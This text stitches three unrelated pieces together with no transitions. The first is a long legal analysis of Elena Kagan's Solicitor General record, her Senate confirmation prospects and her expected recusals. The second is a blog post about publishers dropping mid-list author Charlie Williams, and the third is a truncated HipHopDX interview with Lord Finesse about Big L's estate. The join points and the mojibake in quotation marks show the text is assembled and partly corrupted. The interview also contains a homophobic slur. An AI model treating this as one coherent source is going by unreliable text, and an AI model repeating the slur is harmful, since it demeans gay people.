Senator Lindsay Graham asserted that , under military law , a member of an enemy force can be detained without trial .
When he explained that Attorney General Holder had agreed with that statement in his hearing and asked Kagan whether she agreed , she replied " I think that makes sense , and I think you " ™re correct that that is the law "  ( see hearing video at 1:37:35 ) .
In response to written questions , Kagan declined to answer a question from Senator Specter regarding the rights of detainees held at the Bagram Air Force Base on the ground that she might one day have to participate in ongoing litigation on that question .
Kagan also addressed the Solomon Amendment .
" As the dean of a law school with a general nondiscrimination policy " “ meant to protect each of our students regardless of such factors as race , religion , sex , or sexual orientation " “ I thought the right thing to do was to defend that policy and to do so vigorously .
For that reason , when the Third Circuit held the Solomon Amendment unconstitutional , I reinstated the school " ™s policy pending the Supreme Court " ™s decision in Rumsfeld v. FAIR .
( Of course , Harvard Law School has been in full compliance with the Supreme Court " ™s decision since the day it was issued . )
As Solicitor General , I would have a wholly different role and set of responsibilities . " 
Kagan elaborated as well on the memorandum to Justice Marshall discussed above .
" I indeed believe that my 22 - year - old analysis , written for Justice Marshall , was deeply mistaken .
It seems now utterly wrong to me to say that religious organizations generally should be precluded from receiving funds for providing the kinds of services contemplated by the Adolescent Family Life Act .
I instead agree with the Bowen Court " ™s statement that " [t ] he facially neutral projects authorized by the AFLA - including pregnancy testing , adoption counseling and referral services , prenatal and postnatal care , educational services , residential care , child care , consumer education , etc. are not themselves " specifically religious activities , "  and they are not converted into such activities by the fact that they are carried out by organizations with religious affiliations . " ™
As that Court recognized , the use of a grant in a particular way by a particular religious organization might constitute a violation of the Establishment Clause " “ for example , if the organization used the grant to fund what the Court called " specifically religious activity . " ™
But I think it incorrect ( or , as I more colorfully said at the hearing , " the dumbest thing I ever heard " ™ ) essentially to presume that a religious organization will use a grant of this kind in an impermissible manner . " 

Tenure as Solicitor General [ by Tom Goldstein ]
Elena Kagan is the nation " ™s first female Solicitor General .
Her official profile is available here .
( Barbara Underwood previously held the position on an " acting "  basis . )
The Office of the Solicitor General represents the United States before the Supreme Court .
The Solicitor General herself tends to argue the government " ™s most significant cases before the Court .
She also must personally approve the government " ™s appeals , appellate rehearing requests , and amicus filings .
At the time of her confirmation , like Robert Bork and Kenneth Starr before her , Kagan had not previously argued at the Court .
She elected not to argue a significant voting rights case ( NAMUDNO ) immediately upon taking office , deferring to the lawyers who had prepared the case .
Her first argument came instead in September 2009 in the well - known Citizens United campaign finance case .
The government lost the case by a vote of five - to - four .
In addition to Citizens United , Kagan personally argued five other cases : Salazar v. Buono ( wiki entry here ; opinion here ; transcript here ) , involving a cross on government land , in which the United States prevailed ; Free Enterprise Fund v. PCAOB ( wiki entry here ; transcript here ) , involving the body that issues regulations implementing the Sarbanes - Oxley statute ; United States v. Comstock ( wiki entry here ; transcript here ) , involving the constitutionality of a statute authorizing the civil confinement of sexually dangerous prisoners ; Holder v. Humanitarian Law Project ( wiki entry here ; transcript here ) , involving the material support for terrorism statute ; and Robertson v. United States ex rel .
Watson ( wiki entry here ; transcript here ) , involving a private party " ™s right to pursue a charge of criminal contempt .
Some critics ( and supporters ) attribute to Kagan views on certain legal issues based on positions she took as Solicitor General .
That criticism ( and praise ) is misguided .
The Solicitor General acts as the attorney for the United States and therefore asserts the position of the government , without regard to whether she personally shares the same view .
For Kagan not to have zealously pursued the interests of the United States in each case would have been an abdication of her duties .
There are only a few exceptions " “ rare throughout our history " “ in which the Solicitor General concludes that the government " ™s position has no reasonable basis and therefore refuses to assert it ; Kagan has not participated in such an extreme case .
Executive Power [ by Tom Goldstein ]
Some have criticized Elena Kagan for supposedly favoring a strong view of executive power .
They equate her views with support for the Bush Administration " ™s policies related to the " war on terror . " 
Generally speaking , these critics very significantly misunderstand what Kagan has written .
Kagan " ™s only significant discussion of the issue of executive power comes in her article Presidential Administration , published in 2001 in the Harvard Law Review .
The article has nothing to do with the questions of executive power that are implicated by the Bush policies " “ for example , power in times of war and in foreign affairs .
It is instead concerned with the President " ™s power in the administrative context " “ i.e. , the President " ™s ability to control executive branch and independent agencies .
That kind of power is concerned with , for example , who controls the vast collection of federal agencies as they respond to the Gulf oil spill and the economic crisis .
Nor does the article assert that the President has " power "  over the other branches of government in the constitutional sense " “ i.e. , a power that can not be overridden .
To the contrary , Kagan " accept[s ] Congress " ™ broad power to insulate administrative activity from the President . "  ( 2251 ) .
She instead makes the descriptive claim " that Congress has left more power in Presidential hands than generally is recognized . " 
( Id . )
Kagan does believe that presidential control over the agencies is a good thing .
As a policy matter , but not as a constitutional matter , she therefore shares some common ground with conservatives who believe in a strong , unitary executive .
Conservatives want that presidential control because they believe that it is the best interpretation of the Constitution and because it increases the prospect that agencies can be blocked from running amok , generally by engaging in excessive regulation .
But Kagan favors the idea of Congress allowing strong presidential control for a very different reason .
Based on her then - recent experience in the Clinton Administration , she explains that a progressive President needs control over the agencies to press his agenda .
" Where once presidential supervision had tended to favor politically conservative positions , it generally operated during the Clinton Presidency as a mechanism to achieve progressive goals .
. . .
Clinton showed that presidential supervision could jolt into action bureaucrats suffering from bureaucratic inertia in the face of unmet needs and challenges . "  ( 2249 ) .
There is no link between Kagan " ™s views on the value of Congress permitting strong Executive control of administrative agencies for purposes of achieving progressive goals and the claim that the Bush Administration had the constitutionally conferred power to engage in policies like the NSA wiretapping program and indefinite detention in the war on terror .
They have literally nothing to do with each other .
Critics equally misunderstand a 2006 article in the Yale Law Journal by Kagan " ™s deputy , Neal Katyal ( who prevailed [ with me as co-counsel ] in the Hamdan case ) , when they assert that Katyal views Kagan as asserting a Bush - like vision of presidential power .
Neal K. Katyal , Internal Separation of Powers , 115 Yale L. J. 2314 ( 2006 ) .
Katyal " ™s article does nothing of the sort .
Katyal points to Kagan " ™s view that presidential control encourages " executive energy and dispatch . "  ( 2317 ) .
Katyal believes that a strong Executive " fails to control power "  when one party controls the Congress as well .
( 2332 ) .
But he flatly recognizes that her article is addressed to " domestic policy , "  and he merely analogizes to how similar arguments could be made " in the realm of foreign affairs "  ( 2343 ) , which as noted Kagan was not doing .
Kagan " ™s article , Katyal explains , " is about [ Clinton " ™s ] attempt to use the President " ™s authority to achieve domestic policy goals , "  and Kagan " excludes or distinguishes foreign policy .
As such , the above analysis is not a direct criticism of her article but rather of attempts to extend her concept to foreign affairs . " 
( Id . )
I do think that the two articles suggest that Kagan and Katyal ( both veterans of the Clinton Administration ) differ to some extent on the question whether it is a good or bad thing for the President to exercise strong control and direction over agencies , but that disagreement again has nothing to do with the foreign - affairs - related issues raised by Kagan " ™s critics .
Liberal commentators also point to a brief exchange between Lindsay Graham and Kagan at her confirmation hearings .
As discussed above , Senator Lindsay Graham asserted that , under military law , a member of an enemy force can be detained without trial .
When he explained that Attorney General Holder had agreed with that statement in his hearing and asked Kagan whether she agreed , she replied " I think that makes sense , and I think you " ™re correct that that is the law "  ( see hearing video at 1:37:35 ) .
It seems to me that liberals " ™ reliance on that passage is dramatically overblown .
Kagan was asked whether the Attorney General , for whom she would work directly , was right in his understanding of existing law .
The question had nothing to do with Kagan " ™s own views .
And a single sentence in a confirmation hearing is far too slender a reed on which to base an understanding someone " ™s views on a question as complicated as the President " ™s power in war time .
The point is easily illustrated by a similar exchange with Dawn Johnsen , whom liberals celebrate as an ideal nominee , but who withdrew from consideration to head the Office of Legal Counsel after having been blocked .
Johnsen notably had been exceptionally critical of the Bush Administration " ™s policies in the war on terror .
In written questions subsequent to her confirmation hearing , Senator Hatch asked Johnsen whether she agreed with Kagan " ™s answer that Kagan agreed with Holder .
She responded : " Yes , I do agree with Dean Kagan " ™s statement that under traditional military law , enemy combatants may be detained for the duration of the conflict .
That is what the Supreme Court said as well in Hamdi v. Rumsfeld , 542 U.S. 507 ( 2004 ) . . . .
As indicated above , I do not believe that release or criminal prosecution are the only possible dispositions for detainees . " 
No one believes that Johnsen was embracing the Bush Administration " ™s policies , and no one should think that was true of Kagan either .
Likely Senate Votes For Confirmation [ by Tom Goldstein ]
Elena Kagan " ™s relatively recent confirmation as Solicitor General provides an unusually good window into how she would fare in the Senate if nominated to succeed Justice Stevens .
Generally speaking , I find it unlikely that Kagan would get many ( if any ) more votes than the 68 received by Justice Sotomayor , whom some Republicans found it difficult to oppose because she was the third female Justice , the first Hispanic , and had a powerful personal story .
The Senate is also now more rigidly divided along party lines , in the wake of the health care fight .
Although there were several facts in Sotomayor " ™s record that demonstrated that she was relatively liberal " “ including not only her opinions but also her pre-judicial work for advocacy groups " “ whereas Kagan " ™s record is far thinner on ideological questions , I expect that Republicans " ™ votes on the Sotomayor nomination will substantially guide their approach to a Kagan nomination .
Many Republicans will have a significant predisposition to oppose almost anyone whom a Democratic President nominates .
A material number of Democratic Senators took the same approach to President Bush " ™s nominees .
The most significant point that makes it possible that Kagan could come close to or surpass Sotomayor " ™s vote count is that Sotomayor did face significant opposition from a uniquely powerful interest group " “ the NRA " “ on the basis of a case on which she sat that ruled ( applying prior Second Circuit precedent ) that the Second Amendment is not incorporated against the states .
The NRA will naturally be suspicious of any Democratic nominee , but Kagan does not appear to have the " hook "  for them to engage in active opposition .
I am not aware of any position she has taken " “ before or during her tenure as Solicitor General " “ on the Second Amendment .
Kagan was confirmed as Solicitor General by a vote of 61 to 31 , with 7 Senators not voting .
The 61 " yes "  votes were 52 Democrats , the 2 Independent Senators who caucus with the Democrats ( Joe Lieberman and Bernie Sanders ) , and 7 Republicans .
31 Republicans ( including now - Democrat Arlen Specter ) voted against her .
4 Democrats and 3 Republicans did not vote .
The 4 Democrats were not centrists or conservatives abstaining as a signal of opposition ; they were Boxer , Kennedy , Klobouchar , and Murray .
It is reasonable to expect that Kagan would get the votes of all the Democratic Senators , except possibly one .
In the past five Supreme Court appointments " “ Ginsburg , Breyer , Roberts , Alito , and Sotomayor " “ a Senator of the President " ™s party voted against a nominee only a single time ( out of 494 votes cast ) : Republican Senator Lincoln Chafee voted against Samuel Alito .
Particularly given that Specter is the only current Democrat to have voted against Kagan for Solicitor General , and nothing dramatic has emerged during her tenure or from her record , it is fair to predict that he is the only possible Democratic vote against her for Associate Justice .
She thus starts from a base of 56 votes : the 57 Democrats .
I don" ™t see any reason to believe that Independent Senators would vote against Kagan now .
That makes 58 .
Levels of support from the opposing party are far harder to predict .
There was widespread support from Democrats for Justice Scalia and from Republicans for Ruth Bader Ginsburg .
But the numbers for recent appointments have been much lower .
At the threshold , I don" ™t see any reason that the 30 Republicans who opposed Kagan for Solicitor General would change their minds .
The stakes are higher .
The vote for her confirmation as Solicitor General was also a relatively open prelude to a potential Supreme Court nomination .
So , with 58 votes for and 30 votes against , there are 14 remaining possible pick - ups .
An average of 99 Senators have voted on recent Supreme Court appointments , so it is fair to assume that every or nearly every Senator will vote .
Two further votes for Kagan seem almost certain .
The Senators from Maine " “ Snowe and Collins " “ voted for Kagan for Solicitor General and consistently have taken moderate positions on judgeships , including voting for Sonia Sotomayor .
That makes 60 votes .
After that come four Senators whom I regard as essentially toss - ups and who may well vote together : Specter , Judd Gregg of New Hampshire , and Richard Lugar of Indiana , who voted for Kagan for Solicitor General and for Sotomayor , and is independent minded ; and Lindsay Graham of South Carolina , who has played a leading role in trying to bridge the gap between the parties over judgeships and voted for Sotomayor .
( Graham did not vote on Kagan " ™s Solicitor General nomination . )
I think each will be concerned that Kagan " ™s views on judging will be opaque at her hearing , but all ultimately will vote for her .
That makes 64 votes .
Three other Republicans voted for Kagan for Solicitor General and are accordingly worth watching : Hatch of Utah ; Kyl of Arizona ; and Coburn of Oklahoma .
Each of those states is relatively conservative , having voted for John McCain .
Of these three , I think that only Hatch will vote to confirm Kagan ; he has tended to show Presidents significant deference in this area .
He did vote against Sotomayor , but that was because he was troubled by her record , which does not have a parallel with Kagan , about whom he has spoken favorably .
That makes 65 votes .
A new member has also joined the Senate , Republican Scott Brown .
I have relatively little guidance on how he will vote , but expect that in this important first vote he will stick with the party majority and vote " no . " 
So , in the end , I anticipate that Elena Kagan would receive approximately 65 votes in favor of her confirmation ( 3 fewer than Sotomayor ) : all 57 Democrats ; 2 Independents ; and 6 Republicans ( Snowe and Collins ; 2 Republicans on the Senate Judiciary Committee " “ Graham and Hatch ; and Gregg and Lugar ) .
On this count , 6 Republicans would vote for Kagan .
10 Republicans voted for Sonia Sotomayor .
4 Democrats voted for Samuel Alito .
22 Democrats voted for John Roberts .
The most apt comparison among the nominees with respect to what is known about their ideological views is Kagan and Roberts ; the gap between the 22 Democratic votes he received and the 6 Republican votes she will receive on my count would be significant .
Although the vote will not be overwhelming , there is no reason to believe that the process will be particularly contentious or that her confirmation would ever be in doubt .
Nor would there be a threat of a filibuster .
It is worth pausing on the reasons that Republicans will invoke in voting against Kagan , who has a thin track record on ideological questions that would provide a substantial basis for opposition .
In the case of Sonia Sotomayor , Republicans " ™ stated opposition focused on three things : her vote in the Ricci ( white firefighters ) case ; her vote in the gun-rights case discussed above ; and her repeated " wise Latina "  references in speeches .
For Kagan , I expect the stated rationales for " no "  votes will be her position on the Solomon Amendment ( discussed above ) and ( what I presume will be ) her determination not to provide significant detailed answers to Senators " ™ substantive questions about legal issues , in contrast with the views set forth in her law review article on Supreme Court confirmations .
I anticipate that Republican Senators will refer to what they call a " Kagan standard "  derived from the article that she does not satisfy .
The fact that other recent nominees ( including the nominees of President Bush ) have been no more forthcoming but received Republican votes will go unmentioned .
The Administration also presumably will withhold certain memoranda from her time at the White House as privileged , leading to further Republican objections .
Recusal [ by Tom Goldstein ]
I " ™ve previously discussed the effect of Elena Kagan " ™s role as Solicitor General on the extent to which she would be required ( or would elect ) to recuse herself from cases before the Court .
This final Section is an only slightly revised discussion of that point .
I do update certain numbers based on a updated assumption that Kagan would be nominated " “ and would begin recusing herself as Solicitor General " “ on May 10 rather than May 1 , and also to incorporate the points that I originally made as an addendum in responding to Ed Whelan .
Assertions that Kagan would recuse herself from a significant number of cases have been extrapolated from the experience of the most recent Solicitor - General - turned - Justice : Thurgood Marshall , who recused himself from a majority of merits cases in his first Term ( 1967 ) on the Court .
The numbers for Kagan would not be nearly as dramatic .
For the reasons that I give below , I estimate that Kagan would recuse from 16 merits cases in her first Term .
In Marshall " ™s second Term , he recused from 8 cases because of his role as Solicitor General ; I estimate that the number for Kagan would be 6 .
In no particular order , Kagan would have far fewer recusals principally because ( i ) she would recuse herself earlier in the year , ( ii ) the Court " ™s docket has fewer merits cases with the United States as a party now than it did in 1967 , and ( iii ) a substantial number of Marshall " ™s recusals arose for reasons other than his service as Solicitor General that are not applicable to Kagan .
Marshall served as a Judge on the Second Circuit from 1961 to 1965 .
He was the Solicitor General from August 1965 to August 1967 .
He was nominated to the Supreme Court on June 13 , 1967 , and served as an Associate Justice beginning August 30 , 1967 .
In the interim , Marshall appears to have continued to serve as Solicitor General ( signing briefs and taking on more recusal obligations as a consequence ) ; he did not recuse from serving as the Solicitor General on the basis of his pending Supreme Court nomination .
In his first Term , Marshall recused from 61 argued cases ( as opposed to all decided cases ) , for varied reasons .
( The only other Solicitor General who was directly appointed as a Justice , Stanley Reed , appears to have recused from 29 merits cases in his first Term on the Court ( which he joined in January 1938 ) . )
The level of nonparticipation by Marshall ( and Reed ) is far higher than by most Justices in their first Term .
Erin Miller collected this illustrative data for ten examples :
Because the focus of commentary has been on Marshall " ™s recusals , I reviewed them all , both at the merits and ( where applicable ) cert .
stages , and for many their prior history .
Most of the recusals " “ 53 " “ relate to Marshall " ™s service as Solicitor General .
Marshall appears to have applied a rule that he would recuse from any case in which he had personally participated ( or at least in which his name appeared on the brief ) .
( There are several cases in his first Term in which the United States was a party or an amicus and Marshall " ™s name did not appear on the government " ™s papers , and in which he participated as a Justice . )
In most cases in which Marshall recused based on his role as Solicitor General ( 48 ) , his personal participation in the case is obvious because his name appears on the government " ™s briefs at the cert ./ probable jurisdiction stage ( 33 ) or the cert ./ probable jurisdiction and merits stages ( 15 ) .
In 4 other cases , his recusal indicates that he played some other role " “ for example , authorizing an appeal .
A final case was related to another ruling in which he was otherwise recused .
5 further recusals by Marshall in argued cases appear to relate to his service on the Second Circuit .
2 appear tied to his prior work with the NAACP .
In 1 other case , I can not figure out why he recused .
There is another , smaller body of 4 cases in which Marshall recused when the Supreme Court ruled on the merits without argument " “ i.e. , it disposed of them summarily .
In 2 , his name is on the briefs ; 1 is a continuation of prior litigation in a Supreme Court case from his time as Solicitor General ; and in 1 it appears he authorized the appeal .
There is a final group of 11 cases in which Marshall recused that arguably would have been regarded as merits dispositions in 1967 , but would n " ™t be now ( and hence have no analog for Elena Kagan ) .
In 7 , the Court reversed the lower court " ™s judgment on the merits , merely by providing a citation to a prior Supreme Court ruling .
Those cases would now be handled without deciding the merits by issuing an order vacating the ruling below and remanding to the court of appeals for further consideration .
In the remaining 4 , the Court summarily disposed of " appeals "  " “ 3 times affirming and 1 time dismissing the appeal for " lack of a substantial federal question . " 
This " appellate "  docket has been essentially eliminated by a subsequent statute .
One quick point before moving on .
Marshall " ™s large number of recusals don" ™t seem to have had a significant effect on the outcome of the decisions .
The Court was equally divided 4 - to - 4 in only 2 of the cases .
I am not aware of cases in which Marshall recused himself because he had opined on the constitutionality of a federal statute as Solicitor General .
( Nor am I clear that such an opinion would trigger recusal . )
Similarly , I am not aware ( and I have tried to find out ) of Elena Kagan playing such a role with respect to legislation that is likely to come before the Court .
Analyzing legislation is not the job of the Solicitor General , as opposed to , for example , the Office of Legal Counsel .
I do think that it is possible that in the next few Terms detainee - related cases in which she had played a role would come before the Supreme Court , which would trigger recusal .
But whether and when that would occur is uncertain .
The upshot of the above is that on the basis of his service as Solicitor General , Justice Marshall recused from 57 merits cases in his first Term on the Supreme Court ( 53 argued and 4 summary reversals ) , which was roughly 40 percent of the Court " ™s merits docket that Term .
That is a significant number , although materially less than the one commentators have been citing as the baseline from which to extrapolate how often Kagan would recuse .
Importantly , however , it does not follow that Elena Kagan would recuse from the same proportion of the docket as Marshall did .
I do expect that she would apply the same ethical principle as Marshall : not voting in any case in which she personally participated as Solicitor General .
But for three reasons , her number of recusals ( both absolute and as a proportion of the Court " ™s docket ) would be substantially lower than his .
First , I expect that Kagan would recuse much earlier in the Term ( in late May ) than did Marshall ( in August ) .
The consequence is that she would participate as Solicitor General in materially fewer cases that would come before the Court .
I expect she would do so because the recent practice has been for nominees to cease participating in cases while preparing for confirmation hearings .
Those nominees have been judges , but the principle is the same : the nominee is working on the confirmation process and is not in fact playing an active role in her nominal position .
It would in fact be essentially fictitious for Kagan to sign her name to briefs as Solicitor General , when she would not in fact be working on those cases .
Further , the prospect of recusals interfering with the Court " ™s business is a serious matter " “ because another judge cannot be appointed to take the place of a non-participating Justice " “ so that it makes sense to take reasonable steps to limit unnecessary recusals .
Second , the United States is a party somewhat less often now than it was in 1967 .
In the 1967 Term , the United States was a party in approximately 50 cases that were argued and decided on the merits , which was a little over 40 percent of the argument docket .
In recent Terms , the average numbers have been 28 cases and a little below 40 percent .
Although the United States participates in far more cases as an amicus curiae on the merits now than it did then , those cases would trigger far fewer recusals for Kagan .
Before the United States participates as a party on the merits , it must of course file papers at the cert .
stage ( signed by the Solicitor General ) , which is an early event that can trigger a recusal obligation .
By contrast , when the United States comes in at the merits stage as an amicus " “ the current trend in the docket " “ the Solicitor General gets involved very late .
Thus , if the Court is composed of 50 merits cases in which the United States is a party and 50 in which it is an amicus , a former Solicitor General will recuse from the party cases vastly more often , because s/he will have previously filed a brief in the party cases at the cert .
stage .
Third , the Court " ™s merits docket in the 1967 Term was disproportionately stacked in the early months with merits cases in which the United States was a party early in the Term , and thus with cases triggering recusal by Justice Marshall .
The 2011 Term does not have the same " shape . " 
In fact , it is n" ™t necessary to hypothesize about how often Kagan would be recused .
We can identify the cases specifically .
Start with the existing merits docket for next Term , which produces 6 recusals .
In 4 cases granted so far , Kagan would need to recuse : her name is on the briefs and the United States is a party : Abbott ; Nelson ; Flores - Villar ; and Tohono O" ™odham .
There are an additional 2 merits cases in which the United States participated as an amicus at the cert stage : Staub and Costco .
I expect that the rest of the current merits docket will produce 2 recusals , bringing the total to 8 .
There is a further group of 5 to 7 cases in which cert has been granted and in which I think the United States is likely to file an amicus brief at some point in the spring , though in most of them it will not do so soon .
The practice of that Office is that the Solicitor General herself ordinarily participates only less than a week before the filing of an amicus brief , which would make the relevant due date May 21 ( for a nomination of May 14 , at which point she would be reviewing briefs to be filed a week later ) .
Based on the current briefing schedule , I expect that the government will file amicus briefs in 2 cases in that period .
I am not aware of any additional cases in which the Court has called for the views of the Solicitor General in which the Court is likely to grant cert . , and in which Kagan would have participated in the government " ™s brief before May 14 .
I will say , however , that there is coincidentally a material difference between a nomination date of May 10 and May 21 ( or even May 16 ) .
The government likely will file invited amicus briefs in a number of cases in time for the " cut - off "  date for this Term of roughly May 23 .
Some number of those cases will be granted , and those briefs accordingly would generate recusals if reviewed by the Solicitor General .
( The Solicitor General ordinarily does not participate in meetings with parties about those cases , but it is possible she has done so in a small number , which would itself trigger recusal . )
There are 3 further cases in which the Solicitor General has filed a cert petition .
It is fair to assume that each of those will be granted , and Kagan would necessarily be recused from each .
Assuming a nomination on May 10 , the categories above generate a total of 11 recusals : 6 merits cases ; 2 merits amicus briefs ; and 3 pending cert .
petitions by the Solicitor General .
Because those 11 cases can be identified with specificity , it " ™s worth pausing on their significance and on the question whether the recusal is likely to change the case " ™s outcome .
None has particularly broad jurisprudential or practical significance .
Flores - Villar v. United States could generate ideological disagreement , because it involves alleged gender discrimination .
There are multiple cases involving suits against states by prison inmates , which have ideological overtones .
One case " “ the government " ™s suit against the tobacco industry , in which the Solicitor General " ™s cert .
petition is pending " “ would have significant financial consequences .
( As with Marshall , there is no reason to believe that more than a few of the cases would result in an equally divided court . )
None of the cases compares in importance to the Hamdan case in which John Roberts recused himself , having previously participated as a judge on the court of appeals .
Beyond the specifically identifiable cases , there are two categories of cases I haven " ™t yet covered .
First , there are many cert .
petitions to which the United States has responded but on which the Supreme Court has not acted .
( The Solicitor General often does not review briefs in opposition to certiorari , but because her name appears on the brief , I assume Kagan would regard that as sufficient participation to trigger recusal . )
There is a lead time of essentially four weeks between the date a brief in opposition is filed and the date on which the Court grants certiorari .
So , again assuming a May 10 nomination , there would be a group of cert .
petitions in which the government filed oppositions in the period roughly between April 1 ( the oldest oppositions not yet acted on ) and May 7 ( the final date Kagan would sign a petition ) that could be granted and that could trigger a recusal obligation .
The best I can do is to extrapolate from the Court " ™s merits docket and say that 40 days represents one - ninth of the docket , which equates to just over 1 anticipated cert .
grant ( with around 11 cases a Term granted with the United States as respondent ) .
To be conservative , I " ™ll estimate 2 .
Second , there are cases in which Kagan would be recused because of her personal role in authorizing lower court litigation .
The Solicitor General must personally approve any appeal , rehearing request , or amicus brief by the government .
That is a significant body of cases .
But it is not a large number of cases that end up at the Supreme Court .
Here , we can conservatively extrapolate from the experience of Justice Marshall .
Marshall served as Solicitor General for almost twice as long as Kagan would .
In his first Term , Marshall seems to have recused in roughly 6 cases involving the federal government because of his approval role ( or participation at some other point ) , without having signed a brief .
On the low end , we could extrapolate 1 recusal for Kagan based on her approval role ( because her overall recusal rate is such a small fraction of Marshall " ™s for the reasons discussed above ) and because she would have served roughly half as long as Solicitor General .
But I think a slightly higher number is appropriate because there is a large volume of federal government litigation and because the counter - point to her being nominated earlier in the Term than Marshall is that there will be more cases in which she played an approval role but did not sign the brief .
So I estimate 3 recusals on this ground .
In sum , I would expect a total of 15 recusals " “ 6 pending merits cases , 2 merits amicus briefs , 2 pending cert petitions , 2 pending briefs in opposition , and 3 appeal recommendations " “ if Elena Kagan were nominated on May 10 .
That is roughly one - fifth to one - sixth of the merits docket , nowhere near the number or proportion of cases in which Marshall recused himself .
What about the following Term ?
As I mentioned , commentators have assumed that Kagan " ™s recusal obligations would continue to be very substantial for two to three years .
That is not correct .
Absent an unusual circumstance , the greatest body of cases triggering recusal " “ those in which Kagan actually participated in the Supreme Court as the Solicitor General " “ would all be finalized during the upcoming Term .
After that , her recusal would be triggered by cases in which she had the approval role , discussed above , which arrive at the Supreme Court far less frequently .
In Marshall " ™s second Term , he recused from 14 merits cases ( less than one - fourth of the pace from his first Term ) .
6 of those involved circumstances that likely would not apply to Kagan : 3 original jurisdiction rulings in which the United States was a party ( with no similar pending cases now that I know of ) ; 1 summary affirmance ( with no jurisdictional parallel now ) ; 1 case litigated by the NAACP ; and 1 for which I cannot figure out why Marshall recused .
The 8 remaining cases seem to have involved Marshall " ™s approval responsibilities or litigation that returned to the Court from earlier Terms ( which could happen with Kagan as well ) .
Those 8 recusals by Marshall represent roughly 5 percent of the Court " ™s merits docket .
If anything , the number for Kagan should be smaller because , as noted , she would have served a shorter time as Solicitor General .
But to once again be conservative , I " ™ll estimate 5 cases .
In sum , I estimate that if Elena Kagan is nominated on May 10 , 2010 , she will recuse from 15 merits cases in October Term 2010 and 5 merits cases in October Term 2011 .
If correct , that level of nonparticipation would not be dramatically higher than the average in Erin " ™s illustrative sample above , and would be roughly equal to ( or lower than ) Justices Thomas and Clark .
It would therefore not seem to be a significant basis for not appointing Kagan .
CORRECTION , May 11 : This article originally listed the number of “ scholarly articles ” written by Kagan as five rather than six .
Recently , I read some sad news :
Royston Blake is dead ...
He was murdered by the accountants , condemned to death because his true stories were deemed unprofitable .
They took him out at dawn - gagged , cuffed and hooded – and hanged him high over Hurk Wood ... where all other writers could behold him and quake .
" Heed this warning ! " the accountants shouted .
" Any of you bastards gets any bright ideas about unusual settings and fancy narrative devices , this is what you get .
FUCK your originality - we want sales .
We want cold , hard numbers ! "
For those that do n't know , Royston Blake is – or was – the head doorman of Hoppers wine bar and bistro in Mangel , one of the finest literary depictions of a crap town I have ever encountered .
He was first brought to life in 2004 by Charlie Williams , who published the story of Royston 's struggle to maintain his position as the hardest man in Mangel in the novel Deadfolk .
Deadfolk rightly received a handful of very good reviews and sold a respectable number of copies .
It was followed by Fags and Lager and King of the Road – both of which also received equally favourable reviews , but sold in smaller quantities .
Until recently , that would have been a fairly typical career path for a mid-list author .
Williams would have been able to keep on writing while readers caught up with the series , and hopefully one day , probably several books down the line , he would have had the breakthrough he deserves .
Today things are different .
Shortly after he wrote it ( and his editor said he liked it ) Williams 's publisher told him they wo n't be putting out the fourth Royston Blake novel , Wrongun .
He 's been reduced to trying to change their mind with a Facebook group and blog – hence the typically gloriously sweary quote above .
It 's an all too familiar scenario .
The squeeze on mid-list authors has been a big story in publishing for years now .
It 's impossible even to keep track of which authors have dropped off the radar .
Publishers do n't announce it , and the last thing most writers want to do is broadcast the fact they can no longer get published .
Yet , it seems reasonable to estimate that dozens ( maybe hundreds ) are disappearing every year – judging by persistent industry chatter , not to mention occasional unsettling revelations , such as the fact that many writers have been moved to take legal action against publishers trying to escape their contract commitments .
My instinctive reaction to this annihilation of the mid-list is to blame the publishers .
Quick profits are being put in front of the long - term gains that come from nurturing and developing talent .
To give the most frequently cited example , Ian Rankin and Philip Pullman both published many books before hitting the bestseller lists .
Would they survive today ?
It seems unlikely .
The counter argument is that life is harder for publishers now than it was even 10 years ago – let alone during the glory days of the net book agreement .
I believe Rebecca Gray , the PR at Charlie Williams 's publisher Serpent 's Tail , when she says that her company still loves Royston Blake , but has been thwarted by brutal economics .
" It 's not anybody 's fault , " she told me .
" Not all books can become bestsellers .
You have to be able go out there to persuade booksellers that this is the one .
And because sales figures are so well kept by bookscan now , you can't really be ' creative ' in the way that people used to be . "
In other words , it 's no longer possible to avoid the bottom line .
Shops wo n't stock books when the computer says no .
There 's some room for quibbling here .
Bookscan is less likely to collect figures from the kind of independent store most likely to support the mid-list , for instance .
I also do n't recall seeing any promotion for King of the Road .
If I did n't notice it was out , and I 'm a fan of the series as well as a jobbing book - hack , would anyone else ?
Of course it did n't sell .
Does that prove that future Mangel books wo n't sell if better promoted ?
No .
Finally , forgive my cynicism , but I can't imagine the wonderful Serpent 's Tail taking such a hard - nosed course before they were bought out by Profile .
But then again , would they have been bought out if their dedication to quality over quantity had been sustainable ?
The sad truth is , as Charlie Williams himself said to me : " Voices like mine have to find somewhere else to go . "
And the question is , where ?
On Friday , ( July 9 ) , the leader of the Diggin ’ In The Crates crew , Lord Finesse , spoke to HipHopDX for the site ’s soon - to - be- published piece “ The Making of Big L’s Lifestylez Ov Da Poor & Dangerous . ”
The definitive feature will commemorate this year ’s 15th anniversary of the album ’s release and coincide with this month ’s re-issuing by Traffic Entertainment of L’s often overlooked classic debut from 1995 on double - vinyl .
In the deeply personal final moments of his interview with DX on Friday , Finesse passionately explained why there has yet to be a second posthumous Big L album to follow the gold certified The Big Picture .
While last year during interviews with MTV and DJ Premier ’s LiveFromHQ show on Sirius Finesse revealed the circumstances surrounding the delay , never before has Big L’s big brother in the Rap game spoken with the detail and directness about the situation as Finesse did during his discussion with DX , ( candor that L ’s mentor initially wanted off - the - record before allowing his statements to be presented to the public ) .
HipHopDX : Any archived Big L material still to be released ?
There ’ve always been talks of some sort of posthumous album after The Big Picture , [ so ] is anything coming ?
Lord Finesse : Never .
DX : Is it because you ’re tapped out [ of L material ] …?
Lord Finesse : No , it ’s a few pieces out there .
It ’s just more … hmmm…okay , off the record –
DX : Oh , off the record , alright [ Laughs ] .
Lord Finesse : Okay , off the record , Big L ’s moms , [ Gilda “ Pinky ” Terry ] , raised him , his whole life .
His father abandoned him .
Since he was a kid , just straight never was in his life at all .
No Christmas , no Thanksgivings , none of that .
No birthday cards , none of that .
When L passed and this dude , this fuckin’ faggot pops , found out how popular he was he now wanted to become a part of Big L’s life , and fought to get royalties and stuff that was really due to his moms .
Now [ two years ago ] , Pinky passes , who ’s Big L ’s moms .
So now , since he ’s the father , even though he ’s never been there , [ for his ] kid ’s whole career , his whole life , by law , and by blood , he ’s in charge [ of L’s estate ] now .
And I ca n’t see none of my blood , sweat and tears and efforts being put together for some dude to get credit that was –
You ai n’t even claim this kid as your son .
DX : Did he sue you for masters ; did he try to get tapes from you ?
